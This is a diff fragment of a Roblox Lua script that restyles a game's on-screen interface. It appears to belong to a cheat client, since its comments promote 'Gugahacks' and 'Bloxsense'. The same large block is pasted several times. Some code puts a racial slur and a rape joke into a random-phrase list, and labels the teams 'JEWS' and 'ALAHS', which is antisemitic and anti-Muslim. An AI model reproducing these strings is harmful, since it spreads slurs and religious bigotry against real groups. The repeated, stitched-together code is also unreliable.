+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
